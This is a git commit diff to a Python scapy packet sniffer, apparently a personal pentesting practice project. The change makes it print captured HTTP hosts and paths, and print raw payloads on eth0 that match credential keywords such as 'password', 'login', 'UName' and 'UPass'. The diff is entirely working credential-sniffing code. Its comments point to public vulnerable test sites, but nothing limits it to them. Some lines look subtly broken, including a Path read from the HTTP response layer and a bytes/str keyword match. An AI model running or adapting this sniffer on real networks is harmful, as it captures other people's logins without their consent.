596afcf6d3c20ff6c78a3e22a281c8d67c37e718
Vhackenstance <hackenstance@proton.me>
2026-04-23 16:36:07 -0500

    Rebuild: Sniff url packets are requesting

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -2,13 +2,19 @@
 import scapy.all as scapy
 from scapy.layers import http
 
+keywords =["username", "password", "login", "email", "pass", "log", "UName", "UPass"]
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print(url)
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+            load = packet[scapy.Raw].load
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
 
 sniff("eth0")
--- utils/packet_sniffer_commented.py
+++ utils/packet_sniffer_commented.py
@@ -2,18 +2,21 @@
 from scapy.all import sniff, Raw
 from scapy.layers import http
 
-keywords =["username", "password", "login", "email", "pass", "log"]
+# UName, UPass are our username and password
+keywords =["username", "password", "login", "email", "pass", "log", "UName", "UPass"]
 
 def sniff_interface(interface, process_packet):
     # sniff(er) Arguments:
     # store=False: tells scapy not to store the packets in memory.
     # prn=[CALL_BACK_FUNCTION]:
-    # filter="": tcp, udp, port #, arp,
+    # filter="": tcp, udp, port #, arp, * not used here
     # Filter http packets with a third party module
     sniff(iface=interface, store=False, prn=process_packet)
 
 def get_http(packet):
-    # Does not work because of https
+    # Only works currently with http test sites
+    # http://testasp.vulnweb.com/Default.asp
+    # http://www.pentest-standard.org/index.php/Main_Page
     if packet.haslayer(http.HTTPRequest):
         url = packet[http.HTTPRequest].Host + packet[http.HTTPResponse].Path
         print(url)
